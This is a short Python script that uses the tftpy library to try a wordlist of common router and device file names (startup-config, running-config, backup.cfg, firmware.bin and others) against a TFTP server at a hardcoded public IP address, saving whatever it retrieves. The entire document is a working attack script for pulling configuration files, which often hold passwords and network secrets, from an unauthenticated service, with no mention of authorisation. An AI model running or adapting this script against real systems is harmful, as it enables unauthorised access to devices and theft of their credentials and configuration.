import tftpy
import os

# Set your target TFTP server's IP address here:
target_ip = "217.144.94.2"
target_port = 69

wordlist = [
    "startup-config",
    "running-config",
    "config.txt",
    "router.conf",
    "system.cfg",
    "backup.cfg",
    "default.cfg",
    "firmware.bin",
    "flash.img",
    "settings.conf"
]

os.makedirs("tftp_downloads", exist_ok=True)
client = tftpy.TftpClient(target_ip, target_port)

for filename in wordlist:
    try:
        print(f"[*] Trying to download: {filename}")
        client.download(filename, f"tftp_downloads/{filename}")
        print(f"[+] Success: {filename} saved!")
    except Exception as e:
        print(f"[-] Failed: {filename} ({e})")
